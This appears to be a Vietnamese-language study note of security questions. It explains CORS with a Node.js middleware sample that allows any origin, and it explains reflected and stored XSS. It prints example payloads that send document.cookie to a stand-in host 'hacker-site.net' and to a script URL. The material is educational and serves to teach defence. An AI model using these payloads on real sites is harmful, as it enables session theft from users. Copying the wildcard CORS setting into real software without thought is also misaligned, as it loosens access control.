# Câu hỏi bảo mật
## Câu 1. CORS là gì ?
- CORS: <strong>Cross Origin Resource Sharing</strong>
- CORS là một trong những chính sách bảo mật Same Origin Policy, một chính sách bảo mật được cài đặt trên toàn bộ các trình duyệt hiện nay. Chính sách này để ngăn chặn hoặc cho phép việc truy cập tài nguyên từ Orign này đến Origin khác

<strong>A. Client</strong>
- Khi Client gửi 1 request lên Server. Request này tự động được gắn HTTP Header với thông tin Origin (Thông tin Origin của Client không thể thay đổi được)
- Origin bao gồm 3 thành phần, VD: https://facebook.com:80
 + Protocol: http hoặc https
 + Domain
 + Port

<strong>A. Server</strong>
- Bên Server cài đặt 3 thành phần: Origin, Methods, Content-Type
- VD: Khi sử dụng NodeJS, cài đặt middleware cho phép truy cập từ mọi nguồn

```javascript
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*')
    res.header('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE')
    res.header('Access-Control-Allow-Headers', 'Content-Type')
    next()
})
```

## Câu 2. XSS là gì ?
- XSS: Cross Site Scripting
- XSS là 1 dạng tấn công mà hacker chèn mã độc vào các đoạn script để người dùng thực thi phía Client
- Mục đích tấn công: lấy cookies, session, tokens của người dùng => chiếm quyền truy cập của người dùng

<strong>A. Các dạng tấn công thường thấy</strong>
1. Reflected XSS
- Dạng này thường tấn công 1 người dùng cụ thể
- Hacker gửi cho người dùng URL dạng
http://example.com/name=var+i=new+Image;+i.src="http://hacker-site.net/"%2Bdocument.cookie
--> Sau khi click vào link trên, đoạn script sẽ đc thực hiện, và gửi cookie đến site của hacker
var i=new Image; i.src="http://hacker-site.net/"+document.cookie;

2. Stored XSS
- Trong bài viết, hoặc trong 1 comment, hacker đăng bài, trong đó nội dung được kèm theo 1 đoạn script
```html
<script type=”text/javascript”>
// Nội dung bài viết
var test='../example.php?cookie_data='+escape(document.cookie);
// Nội dung bài viết
</script>
```
- Loại tấn công này, thì cứ khi nào nạn nhân vào đọc bài viết đó thì sẽ thực thi mã độc


